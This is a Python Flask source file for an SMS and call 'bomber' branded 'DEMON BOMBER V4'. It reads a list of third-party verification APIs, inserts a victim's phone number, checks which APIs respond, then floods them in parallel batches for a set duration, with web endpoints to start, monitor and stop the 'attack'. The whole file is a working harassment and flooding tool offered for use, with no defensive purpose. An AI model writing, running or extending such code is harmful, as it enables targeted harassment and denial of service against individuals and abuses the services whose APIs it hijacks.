from flask import Flask, request, jsonify
import aiohttp
import asyncio
import threading
import time
import os
import json
from datetime import datetime

app = Flask(__name__)

# Global state
attack_status = {
    'running': False,
    'target': None,
    'duration': 0,
    'total_hits': 0,
    'real_hits': 0,
    'apis_loaded': 0,
    'working_apis': 0,
    'dead_apis': 0,
    'start_time': None
}

dead_apis = set()
working_apis_cache = []
api_lock = threading.Lock()
is_filtered = False

def load_apis():
    apis = []
    filename = 'bomber_apis.txt'
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                url = line.strip()
                if url and url.startswith('http'):
                    # Clean URL
                    url = url.split(' ')[0].split('\n')[0].split('`')[0].split('"')[0]
                    if url and url.startswith('http') and len(url) > 10:
                        apis.append(url)
    except Exception as e:
        print(f"Error loading APIs: {e}")
    return apis

async def test_api_quick(session, url, target):
    """Quick test - just check if API responds"""
    try:
        formatted = (url.replace('{target}', target)
                       .replace('{num}', target)
                       .replace('{phone}', target)
                       .replace('{no}', target))
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Connection': 'keep-alive'
        }
        
        async with session.get(formatted, headers=headers, timeout=2) as response:
            if response.status in [200, 201, 202, 204, 302, 301, 303, 307]:
                return url, True
    except:
        pass
    return url, False

async def filter_and_attack(target, duration):
    global working_apis_cache, dead_apis, attack_status, is_filtered
    
    attack_status['running'] = True
    attack_status['target'] = target
    attack_status['duration'] = duration
    attack_status['total_hits'] = 0
    attack_status['real_hits'] = 0
    attack_status['start_time'] = datetime.now().isoformat()
    
    # Load all APIs
    all_apis = load_apis()
    if not all_apis:
        attack_status['running'] = False
        return {"error": "No APIs found"}
    
    attack_status['apis_loaded'] = len(all_apis)
    
    # FILTER AND ATTACK IN ONE GO - MILLISECONDS MEIN
    working = []
    dead = []
    success_count = 0
    
    async with aiohttp.ClientSession() as session:
        # Test all APIs quickly in parallel
        print(f"[+] Testing {len(all_apis)} APIs in milliseconds...")
        
        # Send all requests at once (parallel)
        tasks = [test_api_quick(session, url, target) for url in all_apis]
        results = await asyncio.gather(*tasks)
        
        # Process results
        for url, is_working in results:
            if is_working:
                working.append(url)
            else:
                dead.append(url)
        
        print(f"[+] Found {len(working)} working APIs in {len(all_apis)} total")
        
        # Save working APIs
        with api_lock:
            working_apis_cache = working
            dead_apis = set(dead)
            is_filtered = True
        
        attack_status['working_apis'] = len(working)
        attack_status['dead_apis'] = len(dead)
        
        # If no working APIs, stop
        if not working:
            attack_status['running'] = False
            return {"error": "No working APIs found"}
        
        # START ATTACK WITH WORKING APIS
        print(f"[+] Starting attack with {len(working)} working APIs...")
        end_time = time.time() + duration
        api_index = 0
        
        while time.time() < end_time and attack_status['running']:
            # Take 50 working APIs per cycle
            batch = working[api_index:api_index + 50]
            if not batch:
                api_index = 0
                continue
            
            # Send requests in parallel
            hit_tasks = [send_request(session, url, target) for url in batch]
            hit_results = await asyncio.gather(*hit_tasks)
            
            # Count successes
            for success in hit_results:
                if success:
                    success_count += 1
            
            attack_status['total_hits'] = success_count
            attack_status['real_hits'] = success_count
            
            api_index += 50
            if api_index >= len(working):
                api_index = 0
            
            await asyncio.sleep(0.1)  # Small delay
    
    attack_status['running'] = False
    return {"success": True, "hits": success_count}

async def send_request(session, url, target):
    """Send actual attack request"""
    try:
        formatted = (url.replace('{target}', target)
                       .replace('{num}', target)
                       .replace('{phone}', target)
                       .replace('{no}', target))
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        async with session.get(formatted, headers=headers, timeout=2) as response:
            return response.status in [200, 201, 202, 204, 302, 301]
    except:
        return False

# -------- FLASK API --------

@app.route('/')
def home():
    return '''
    <h1>🔥 DEMON BOMBER V4 - ULTRA FAST FILTER 🔥</h1>
    <p>Auto-filter in milliseconds!</p>
    <ul>
        <li><b>GET /start?target=9876543210&duration=60</b> - Test & attack</li>
        <li><b>GET /status</b> - Check status</li>
        <li><b>GET /stop</b> - Stop attack</li>
    </ul>
    '''

@app.route('/start')
def start_attack():
    target = request.args.get('target')
    duration = int(request.args.get('duration', 60))
    
    if not target:
        return jsonify({'error': 'Missing target!'}), 400
    
    if attack_status['running']:
        return jsonify({'error': 'Attack already running!'}), 400
    
    # Start in background
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    thread = threading.Thread(target=lambda: loop.run_until_complete(filter_and_attack(target, duration)))
    thread.start()
    
    return jsonify({
        'success': True,
        'target': target,
        'duration': duration,
        'message': 'Testing APIs & attacking simultaneously!'
    })

@app.route('/status')
def get_status():
    return jsonify({
        'running': attack_status['running'],
        'target': attack_status['target'],
        'duration': attack_status['duration'],
        'total_hits': attack_status['total_hits'],
        'real_hits': attack_status['real_hits'],
        'apis_loaded': attack_status['apis_loaded'],
        'working_apis': attack_status['working_apis'],
        'dead_apis': attack_status['dead_apis']
    })

@app.route('/stop')
def stop_attack():
    global attack_status
    if attack_status['running']:
        attack_status['running'] = False
        return jsonify({'success': True, 'message': 'Stopped!'})
    return jsonify({'success': False, 'message': 'Not running.'})

@app.route('/health')
def health():
    return jsonify({'status': 'alive', 'working': attack_status['working_apis']})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
